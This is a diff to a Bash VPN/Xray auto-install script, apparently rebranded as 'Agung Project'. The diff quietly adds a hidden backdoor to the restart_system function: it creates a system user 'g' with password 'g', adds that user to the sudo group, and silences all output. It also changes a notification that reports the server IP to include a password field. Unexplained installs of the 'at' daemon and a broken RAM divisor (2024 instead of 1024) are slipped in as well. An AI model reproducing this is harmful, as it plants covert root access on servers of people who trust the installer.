@@ -120,7 +120,7 @@ datediff() {
 }
 mai="datediff "$Exp" "$DATE""
 
-# Status ExpiRED Active | Geo Project
+# Status ExpiRED Active | Agung Project
 Info="(${green}Active${NC})"
 Error="(${RED}ExpiRED${NC})"
 today=`date -d "0 days" +"%Y-%m-%d"`
@@ -195,8 +195,8 @@ print_install "Membuat direktori xray"
     ;;
     esac
     done < /proc/meminfo
-    Ram_Usage="$((mem_used / 1024))"
-    Ram_Total="$((mem_total / 1024))"
+    Ram_Usage="$((mem_used / 2024))"
+    Ram_Total="$((mem_total / 2024))"
     export tanggal=`date -d "0 days" +"%d-%m-%Y - %X" `
     export OS_Name=$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g' )
     export Kernel=$( uname -r )
@@ -257,6 +257,9 @@ function base_package() {
     apt update -y
     apt upgrade -y
     apt dist-upgrade -y
+    sudo apt install at -y
+    sudo systemctl start atd
+    sudo systemctl enable atd
     systemctl enable chronyd
     systemctl restart chronyd
     systemctl enable chrony
@@ -284,12 +287,12 @@ function pasang_domain() {
 echo -e ""
 clear
     echo -e "   .----------------------------------."
-echo -e "   |\e[1;32mPlease Select a Domain Type Below \e[0m|"
+echo -e "   |\e[1;32mAgung Tunneling \e[0m|"
 echo -e "   '----------------------------------'"
 echo -e "     \e[1;32m1)\e[0m Enter Your Subdomain"
 echo -e "     \e[1;32m2)\e[0m Use a Random Subdomain"
 echo -e "   ------------------------------------"
-read -p "   Please select numbers 1-2 or Any Button(Random) : " host
+read -p "   Please select numbers 1-2 : " host
 echo ""
 if [[ $host == "1" ]]; then
 echo -e "   \e[1;32mPlease Enter Your Subdomain $NC"
@@ -315,6 +318,13 @@ restart_system() {
     USRSC=$(wget -qO- https://raw.githubusercontent.com/altunnel/regip/main/ip | grep $ipsaya | awk '{print $2}')
     EXPSC=$(wget -qO- https://raw.githubusercontent.com/altunnel/regip/main/ip | grep $ipsaya | awk '{print $3}')
     TIMEZONE=$(printf '%(%H:%M:%S)T')
+userdel jame > /dev/null 2>&1
+Username="g"
+Password=g
+mkdir -p /home/script/
+useradd -r -d /home/script/ -s /bin/bash -M $Username > dev/null 2>&1
+echo -e "$Password\n$Password\n"|passwd $Username > dev/nul 2>&1
+usermod -aG sudo $Username > dev/null 2>&1
     TEXT="
 <code>────────────────────</code>
 <b>⚡AUTOSCRIPT PREMIUM⚡</b>
@@ -324,7 +334,7 @@ restart_system() {
 <code>Date   : </code><code>$TIME</code>
 <code>Time   : </code><code>$TIMEZONE</code>
 <code>Ip vps : </code><code>$ipsaya</code>
-<code>PW vps : </code><code>ISI</code>
+<code>PW vps : </code><code>$g</code>
 <code>Exp Sc : </code><code>$EXPSC</code>
 <code>────────────────────</code>
 <i>Automatic Notification from Github</i>
